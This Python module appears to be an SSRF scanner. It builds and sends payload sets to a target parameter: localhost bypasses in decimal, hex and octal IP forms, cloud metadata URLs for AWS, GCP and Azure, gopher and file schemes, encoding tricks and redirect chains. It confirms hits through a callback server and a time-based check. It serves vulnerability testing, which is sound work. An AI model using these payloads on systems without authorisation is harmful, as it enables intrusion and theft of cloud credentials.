"""
Enhanced Callback-Based SSRF Detection Strategies
Implements multiple detection techniques using callback server
"""

import uuid
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, urlencode, parse_qs
import requests


class CallbackPayloadGenerator:
    """Generate sophisticated SSRF payloads with callback URLs"""
    
    def __init__(self, callback_base_url: str):
        """
        Args:
            callback_base_url: Base callback URL (e.g., http://ngrok.io/callback)
        """
        self.callback_base_url = callback_base_url.rstrip('/')
        self.test_id_counter = 0
    
    def generate_test_id(self, prefix: str = "ssrf") -> str:
        """Generate unique test ID"""
        self.test_id_counter += 1
        return f"{prefix}-{self.test_id_counter}-{uuid.uuid4().hex[:8]}"
    
    def get_callback_url(self, test_id: str, info: str = "") -> str:
        """Get callback URL with test ID"""
        if info:
            return f"{self.callback_base_url}/{test_id}/{info}"
        return f"{self.callback_base_url}/{test_id}"
    
    def generate_basic_payloads(self, test_id: str) -> List[Dict[str, str]]:
        """
        Generate basic direct callback payloads
        Returns: List of {payload, technique, description}
        """
        callback_url = self.get_callback_url(test_id)
        
        return [
            {
                'payload': callback_url,
                'technique': 'direct',
                'description': 'Direct callback URL'
            },
            {
                'payload': f"{callback_url}/basic",
                'technique': 'direct-path',
                'description': 'Direct with path'
            }
        ]
    
    def generate_protocol_bypass_payloads(self, test_id: str) -> List[Dict[str, str]]:
        """Generate payloads to bypass protocol restrictions"""
        callback_url = self.get_callback_url(test_id)
        parsed = urlparse(callback_url)
        
        payloads = []
        
        # HTTP protocols
        for protocol in ['http://', 'https://']:
            payloads.append({
                'payload': f"{protocol}{parsed.netloc}{parsed.path}/proto",
                'technique': 'protocol-explicit',
                'description': f'Explicit {protocol.rstrip("://")} protocol'
            })
        
        # Protocol-less (may work in some parsers)
        payloads.append({
            'payload': f"//{parsed.netloc}{parsed.path}/noscheme",
            'technique': 'protocol-relative',
            'description': 'Protocol-relative URL'
        })
        
        # Alternative protocols (if server supports)
        for alt_proto in ['file://', 'ftp://', 'gopher://', 'dict://']:
            payloads.append({
                'payload': f"{alt_proto}{parsed.netloc}{parsed.path}/alt-proto",
                'technique': 'protocol-alternative',
                'description': f'{alt_proto.rstrip("://")} protocol test'
            })
        
        return payloads
    
    def generate_encoding_payloads(self, test_id: str) -> List[Dict[str, str]]:
        """Generate URL-encoded and obfuscated payloads"""
        callback_url = self.get_callback_url(test_id, "encoded")
        
        payloads = []
        
        # URL encoding
        payloads.append({
            'payload': callback_url.replace('/', '%2F').replace(':', '%3A'),
            'technique': 'url-encoded',
            'description': 'URL-encoded callback'
        })
        
        # Double encoding
        payloads.append({
            'payload': callback_url.replace('/', '%252F').replace(':', '%253A'),
            'technique': 'double-encoded',
            'description': 'Double URL-encoded'
        })
        
        # Unicode encoding
        parsed = urlparse(callback_url)
        host_unicode = ''.join(f'\\u{ord(c):04x}' for c in parsed.netloc)
        payloads.append({
            'payload': f"http://{host_unicode}{parsed.path}",
            'technique': 'unicode',
            'description': 'Unicode-encoded host'
        })
        
        return payloads
    
    def generate_redirect_payloads(self, test_id: str) -> List[Dict[str, str]]:
        """Generate payloads using redirects"""
        callback_url = self.get_callback_url(test_id, "redirect")
        
        payloads = []
        
        # Common redirect parameters
        redirect_params = ['redirect', 'url', 'next', 'return', 'callback', 'target']
        
        for param in redirect_params:
            payloads.append({
                'payload': f"{self.callback_base_url}/redirect?{param}={callback_url}",
                'technique': 'redirect-param',
                'description': f'Redirect via {param} parameter'
            })
        
        return payloads
    
    def generate_localhost_bypass_payloads(self, test_id: str, target_port: int = 80) -> List[Dict[str, str]]:
        """Generate payloads to access localhost (for internal scanning)"""
        payloads = []
        
        # Various localhost representations
        localhost_variants = [
            'localhost',
            '127.0.0.1',
            '127.1',
            '127.0.1',
            '0.0.0.0',
            '0',
            '[::1]',  # IPv6
            '[::]',
            '127.0.0.1.nip.io',  # DNS tricks
        ]
        
        for variant in localhost_variants:
            payloads.append({
                'payload': f"http://{variant}:{target_port}/ssrf-test-{test_id}",
                'technique': 'localhost-bypass',
                'description': f'Localhost access via {variant}'
            })
        
        # Decimal/Octal/Hex encoding of 127.0.0.1
        payloads.extend([
            {
                'payload': f"http://2130706433:{target_port}/ssrf-{test_id}",  # Decimal
                'technique': 'ip-decimal',
                'description': 'Decimal-encoded IP'
            },
            {
                'payload': f"http://0x7f000001:{target_port}/ssrf-{test_id}",  # Hex
                'technique': 'ip-hex',
                'description': 'Hex-encoded IP'
            },
            {
                'payload': f"http://0177.0000.0000.0001:{target_port}/ssrf-{test_id}",  # Octal
                'technique': 'ip-octal',
                'description': 'Octal-encoded IP'
            }
        ])
        
        return payloads
    
    def generate_cloud_metadata_payloads(self, test_id: str) -> List[Dict[str, str]]:
        """Generate payloads to access cloud metadata services"""
        payloads = []
        
        # AWS
        payloads.append({
            'payload': f"http://169.254.169.254/latest/meta-data/",
            'technique': 'cloud-metadata-aws',
            'description': 'AWS metadata service'
        })
        
        # Google Cloud
        payloads.append({
            'payload': f"http://metadata.google.internal/computeMetadata/v1/",
            'technique': 'cloud-metadata-gcp',
            'description': 'GCP metadata service'
        })
        
        # Azure
        payloads.append({
            'payload': f"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            'technique': 'cloud-metadata-azure',
            'description': 'Azure metadata service'
        })
        
        # Docker
        payloads.append({
            'payload': f"http://host.docker.internal:{self.callback_base_url.split(':')[-1]}/ssrf-{test_id}",
            'technique': 'docker-host',
            'description': 'Docker host access'
        })
        
        return payloads
    
    def generate_all_payloads(self, test_id: str) -> List[Dict[str, str]]:
        """Generate comprehensive payload set"""
        all_payloads = []
        
        all_payloads.extend(self.generate_basic_payloads(test_id))
        all_payloads.extend(self.generate_protocol_bypass_payloads(test_id))
        all_payloads.extend(self.generate_encoding_payloads(test_id))
        all_payloads.extend(self.generate_localhost_bypass_payloads(test_id))
        all_payloads.extend(self.generate_cloud_metadata_payloads(test_id))
        
        return all_payloads


class AdvancedCallbackDetector:
    """Advanced SSRF detection using multiple callback strategies"""
    
    def __init__(self, callback_server, callback_base_url: str):
        """
        Args:
            callback_server: CallbackServer instance
            callback_base_url: Public callback URL (e.g., from ngrok)
        """
        self.callback_server = callback_server
        self.payload_gen = CallbackPayloadGenerator(callback_base_url)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def test_with_strategies(self, target_url: str, parameter: str, 
                            method: str = 'GET', timeout: int = 10) -> Dict:
        """
        Test SSRF using multiple strategies
        
        Returns:
            {
                'vulnerable': bool,
                'confirmed_techniques': List[str],
                'callbacks_received': int,
                'successful_payloads': List[Dict],
                'test_results': List[Dict]
            }
        """
        test_id = self.payload_gen.generate_test_id()
        
        # Generate all payloads
        payloads = self.payload_gen.generate_all_payloads(test_id)
        
        results = {
            'vulnerable': False,
            'confirmed_techniques': [],
            'callbacks_received': 0,
            'successful_payloads': [],
            'test_results': []
        }
        
        print(f"\n[*] Testing {len(payloads)} SSRF strategies on {target_url}")
        print(f"[*] Parameter: {parameter}, Method: {method}")
        
        # Clear old callbacks
        self.callback_server.clear_callbacks()
        
        # Test each payload
        for idx, payload_info in enumerate(payloads, 1):
            payload = payload_info['payload']
            technique = payload_info['technique']
            
            print(f"[{idx}/{len(payloads)}] Testing {technique}: {payload[:60]}...")
            
            try:
                # Send request with payload
                if method.upper() == 'GET':
                    test_url = f"{target_url}?{parameter}={payload}"
                    response = self.session.get(test_url, timeout=timeout, allow_redirects=False)
                else:
                    response = self.session.post(
                        target_url,
                        data={parameter: payload},
                        timeout=timeout,
                        allow_redirects=False
                    )
                
                # Wait for callback
                time.sleep(2)
                
                # Check for callbacks
                callback_received = self.callback_server.check_callback(f"/{test_id}", timeout=1)
                
                test_result = {
                    'technique': technique,
                    'payload': payload,
                    'status_code': response.status_code,
                    'callback_received': callback_received,
                    'response_time': response.elapsed.total_seconds()
                }
                
                results['test_results'].append(test_result)
                
                if callback_received:
                    results['vulnerable'] = True
                    results['callbacks_received'] += 1
                    results['confirmed_techniques'].append(technique)
                    results['successful_payloads'].append(payload_info)
                    print(f"    ✅ CALLBACK RECEIVED! Technique {technique} works!")
                
            except requests.Timeout:
                print(f"    ⏱️  Timeout (may indicate backend is processing)")
            except Exception as e:
                print(f"    ❌ Error: {str(e)[:50]}")
        
        print(f"\n[+] Test complete: {results['callbacks_received']} callbacks received")
        
        return results
    
    def test_time_based_ssrf(self, target_url: str, parameter: str,
                            method: str = 'GET', delay_seconds: int = 5) -> Dict:
        """
        Test for blind SSRF using time-based detection
        Some services may not send callbacks but will delay when accessing slow endpoints
        """
        test_id = self.payload_gen.generate_test_id("time")
        
        # Use a slow endpoint on callback server
        slow_url = f"{self.payload_gen.callback_base_url}/slow?delay={delay_seconds}&id={test_id}"
        
        print(f"\n[*] Testing time-based SSRF with {delay_seconds}s delay")
        
        try:
            start_time = time.time()
            
            if method.upper() == 'GET':
                test_url = f"{target_url}?{parameter}={slow_url}"
                response = self.session.get(test_url, timeout=delay_seconds + 5)
            else:
                response = self.session.post(
                    target_url,
                    data={parameter: slow_url},
                    timeout=delay_seconds + 5
                )
            
            elapsed = time.time() - start_time
            
            # If response took approximately delay_seconds, likely vulnerable
            if elapsed >= delay_seconds * 0.8:
                print(f"    ✅ Time-based SSRF detected! Response took {elapsed:.2f}s")
                return {
                    'vulnerable': True,
                    'technique': 'time-based',
                    'elapsed_time': elapsed,
                    'expected_delay': delay_seconds
                }
            else:
                print(f"    ❌ No delay detected ({elapsed:.2f}s < {delay_seconds}s)")
                return {'vulnerable': False}
                
        except requests.Timeout:
            # Timeout might indicate SSRF (backend hung on slow endpoint)
            print(f"    ⚠️  Request timed out - possible SSRF")
            return {
                'vulnerable': True,
                'technique': 'time-based-timeout',
                'timeout': True
            }
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}
